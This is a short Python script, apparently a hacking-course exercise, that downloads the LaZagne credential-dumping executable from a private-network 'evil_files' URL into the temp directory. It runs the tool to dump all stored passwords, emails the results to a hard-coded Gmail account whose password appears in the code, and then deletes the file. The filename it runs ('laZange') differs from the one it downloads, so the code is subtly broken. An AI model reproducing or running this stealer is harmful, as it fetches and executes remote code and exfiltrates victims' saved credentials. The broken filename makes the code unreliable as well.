#!/usr/bin/env python


import subprocess, smtplib, requests, os, tempfile


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()



def download(url):
    get_response = requests.get(url)    #I am using get function of requests to get repsonse
                                        #print(get_response.content)        #binary content of the file
    file_name = url.split("/")[-1]      #to get the last element of the url
    with open(file_name, "wb") as out_file:   #creating a file in python as sample.txt and using mode w,r,rw and using out_file to implement other basic stuffs
        out_file.write(get_response.content)
                                        #wb is used to open binary file here

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://10.0.2.15/evil_files/laZagne_x86.exe")
result = subprocess.check_output("laZange_x86.exe all", shell= True)
send_mail("hacker.machine.python@gmail.com", "Kumar@123", result)
os.remove("laZange_x86.exe")